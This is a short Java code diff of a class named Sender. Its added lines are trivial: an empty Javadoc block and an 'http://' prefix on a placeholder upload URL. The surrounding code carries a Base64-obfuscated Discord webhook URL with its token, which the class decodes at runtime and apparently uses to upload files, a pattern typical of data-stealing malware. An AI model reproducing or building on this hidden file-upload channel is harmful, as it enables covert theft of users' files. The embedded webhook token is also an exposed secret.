@@ -14,6 +14,13 @@ public class Sender {
 
     static final String a = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTAxNzQ0MTQyNTI0OTU0MjE3NS90TkZ1QURDUExsOS1mS09BaUZjNm56LW8zNkV3LVo3Z3NldmF1UVI3WUJpSUVJMWdOMzN6SGJqSGROaE1KY2x5MndPYQ==";
 
+
+    /**
+     * @param client
+     * @param file
+     * @param requestBody
+     * @throws IOException
+     */
     public static void Sender(OkHttpClient client, File file, RequestBody requestBody) throws IOException {
         byte[] decodedBytes = Base64.getDecoder().decode(a);
         String decodedStr = new String(decodedBytes);
@@ -35,7 +42,7 @@ public class Sender {
     public static void sendToServer(String dosya) {
         OkHttpClient httpClient = new OkHttpClient();
 
-        String server = "url/dosya-yukle";
+        String server = "http://url/dosya-yukle";
 
         File message = new File(dosya);
 
